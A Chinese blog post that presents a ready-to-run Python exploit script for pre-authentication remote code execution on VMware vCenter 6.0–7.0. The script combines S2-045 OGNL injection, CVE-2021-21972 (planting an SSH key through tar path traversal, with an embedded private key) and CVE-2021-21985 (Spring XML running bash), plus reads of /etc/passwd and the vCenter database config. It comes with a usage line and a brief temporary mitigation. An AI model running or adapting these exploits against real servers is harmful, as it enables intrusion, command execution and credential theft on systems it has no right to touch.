---
title: vCenter RCE
author: Admin
date: 2021-02-24 20:21:00 +0800
categories: [渗透测试, 内网]
tags: [vsphere, vcenter, vmware]
---

# 开宗明义

三个前台rce，通杀6.0-7.0版本。对于CVE-2021-21972，请自行生成公私钥填入脚本中。

# poc

```python
import io
import sys
import base64
import tarfile
import zipfile
import requests
import paramiko
from http import client

client.HTTPConnection._http_vsn = 10
client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
requests.packages.urllib3.disable_warnings()

pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvLHAVkIvk1gOBd' \
      '+yKGAKcq28IJCiSq4fRZKWLU2A8GWanRUjNrI4tbD3eCEPmCWIsn30sDyMhPkRKgPRDnB8tj1hpbXmOQ8LKn' \
      '+4SbcaJfvYYbU8yRDYnI6RLCGtVAvg260wDgkKWl0lTJ1HkKHgKKQ0Ez1BxaOpDWVWExJAkkWbuWIie3E4Uo' \
      '9Y8rKBSxmoiRxwM2xwMUuPpWZwg1hdtrMf8xX1QEsQ3gtivXG5DqhSlG74/Virwku2xyK6LPe8h/PH0oFV6C' \
      'f36dzs14z/foti13iBE29VLES93llkOsrdgQbhX3F3gmzzP9NZqRgHllHZFxKlu1pPPnUKFQjFJxtg9H21FT' \
      'mjEXz58cUXCLL82M6+jHKlFruO/3/ppwFm6vBHcvAahtMYSFL06Cvn0bViNoeI59xemwfAHTCqF5FR418FdH' \
      'D+BYnSoeQs7ptrCs/mD5rCL5WZkplzyV/yWjX7UpzOa49ZLEybR7wlc9NywEvEd8NAyjd9NZy7S808= vsphere'
pri = '''-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
'''


def create_tar(file_dict: dict) -> bytes:
    tar: tarfile.TarFile = tarfile.open(mode="w", fileobj=(t := io.BytesIO()))
    for key in file_dict.keys():
        tarinfo: tarfile.TarInfo = tarfile.TarInfo(name=key)
        f: io.BytesIO = io.BytesIO(file_dict[key].encode())
        tarinfo.size = len(f.read())
        f.seek(0)
        tar.addfile(tarinfo, fileobj=f)
    tar.close()
    t.seek(0)
    return t.read()


def exec_command(ip: str, shell: str) -> tuple:
    ssh: paramiko.SSHClient = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        hostname=ip,
        port=22,
        username='vsphere-ui',
        pkey=paramiko.RSAKey.from_private_key(file_obj=io.StringIO(pri))
    )
    return ssh.exec_command(shell)


def poc_6_5__7_uploadfile(url: str, shell: str) -> bool:
    base_url: str = "/ui/vropspluginui/rest/services/uploadova"
    tar_file: bytes = create_tar({"../../home/vsphere-ui/.ssh/authorized_keys": pub})
    files: dict = {
        'uploadFile': (
            'a.tar',
            tar_file,
            'tar'
        )
    }
    r: requests.Response = requests.post(url + base_url, files=files, verify=False)
    print(r.text)
    if r.text != 'SUCCESS':
        return False
    else:
        print()
        stdin, stdout, stderr = exec_command((ip := url.split('/')[2]), shell)
        print('[+] output:')
        print(stdout.read().decode())
        print(stderr.read().decode())
        exec_command(ip, 'rm /home/vsphere-ui/.ssh/authorized_keys')
        return True


def poc_6_0__5_readfile(url: str):
    base_url: str = "/eam/vib?id="
    files: list = ["/etc/passwd", "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties"]
    for i in files:
        r: requests.Response = requests.get(url + base_url + i, verify=False)
        print(r.text)


def poc_6_0_rce(url: str, shell: str) -> bool:
    base_url: str = "/statsreport/"
    header: dict = {
        "Content-Type": "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
                        "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
                        "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                        "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear("
                        ")).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='",
    }
    header["Content-Type"] = header["Content-Type"] + shell
    header["Content-Type"] = header["Content-Type"] + "').(#iswin=(@java.lang.System@getProperty(" \
                                                      "'os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{" \
                                                      "'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new " \
                                                      "java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(" \
                                                      "true)).(#process=#p.start()).(#ros=(" \
                                                      "@org.apache.struts2.ServletActionContext@getResponse(" \
                                                      ").getOutputStream())).(@org.apache.commons.io.IOUtils@copy(" \
                                                      "#process.getInputStream(),#ros)).(#ros.flush())} "
    r: requests.Response = requests.get(url + base_url, headers=header, verify=False)
    if len(r.text) != 0 and r.status_code != 404:
        print()
        print('[+]output: ')
        print(r.text)
        return True
    else:
        return False


def create_zip(file_dict: dict) -> bytes:
    zip = zipfile.ZipFile((t := io.BytesIO()), "w", zipfile.ZIP_DEFLATED)
    for key in file_dict.keys():
        zip.writestr(key, file_dict[key].encode())
    zip.close()
    t.seek(0)
    return t.read()


def poc_6_5__7_bean(url, cmd) -> bool:
    xml = """<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ echo """ + base64.b64encode(cmd.encode()).decode() + """ |base64 -d |bash -i ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\\n&quot;))) }"/>
    </bean>

</beans>"""
    zip_file: bytes = create_zip({"./.offline_bundle.xml": xml})
    data: dict = {
        "methodInput": [[
            "https://localhost:443/vsanHealth/vum/driverOfflineBundle/" + requests.utils.quote(
                "data:text/html;base64," + base64.b64encode(zip_file).decode())
        ]]
    }
    base_path: str = "/ui/h5-vsan/rest/proxy/service/"
    beanIdOrClassName: str = "vmodlContext"
    methodName: str = "loadVmodlPackages"
    r = requests.post(url + base_path + beanIdOrClassName + "/" + methodName, json=data, verify=False)
    if "Failed to extract requested data. Check vSphere Client logs for details." not in r.text:
        return False
    beanIdOrClassName = "systemProperties"
    methodName = "getProperty"
    data["methodInput"] = ["output", None]
    r = requests.post(url + base_path + beanIdOrClassName + "/" + methodName, json=data, verify=False)
    print()
    print('[+]output: ')
    print(r.text)
    return True


if __name__ == '__main__':
    print('[+] url: ' + (url := sys.argv[1]))
    print('[+] cmd: ' + (cmd := ' '.join(sys.argv[2:])))
    sys.stdout.write('[*] check poc for vcenter 6.0  (S2-045)')
    if poc_6_0_rce(url, cmd):
        exit()
    else:
        sys.stdout.write(' ...failed!')
        print()
    sys.stdout.write('[*] check poc for vcenter 6.5-7.0 (CVE-2021-21972)')
    if poc_6_5__7_uploadfile(url, cmd):
        exit()
    else:
        sys.stdout.write(' ...failed!')
        print()
    sys.stdout.write('[*] check poc for vcenter 6.5-7.0 (CVE-2021-21985)')
    if poc_6_5__7_bean(url, cmd):
        sys.stdout.write(' ...存在漏洞，如无回显示请手动尝试构造XML http://noahblog.360.cn/vcenter-cve-2021-2021-21985/')
        exit()
    else:
        sys.stdout.write(' ...failed!')
        print()
    poc_6_0__5_readfile(url)
    print()
    print('[-] no dong')


```

# 用法

```shell
> python3.9 vcenter_rce.py https://xxx.xxx.xxx.xxx whoami
```

# 漏洞修复

## 临时修复办法
ssh登录到vCenter主机上，执行:
```shell
service-control --stop vsphere-ui
cp -v /etc/vmware/vsphere-ui/compatibility-matrix.xml /etc/vmware/vsphere-ui/compatibility-matrix.xml.backup
sed -i 's/<pluginsCompatibility>/<pluginsCompatibility><PluginPackage id="com.vmware.vrops.install" status="incompatible"\/><PluginPackage id="com.vmware.vsphere.client.h5vsan" status="incompatible"\/><PluginPackage id="com.vmware.vrUi" status="incompatible"\/> <PluginPackage id="com.vmware.vum.client" status="incompatible"\/><PluginPackage id="com.vmware.h4.vsphere.client" status="incompatible"\/>/g' /etc/vmware/vsphere-ui/compatibility-matrix.xml
service-control --start vsphere-ui
```

# TODO

对于CVE-2021-21972本来想找个地方写jsp的，但是没找到通杀位置。写ssh公私钥也能凑合用，有时间再填坑。咕咕咕...
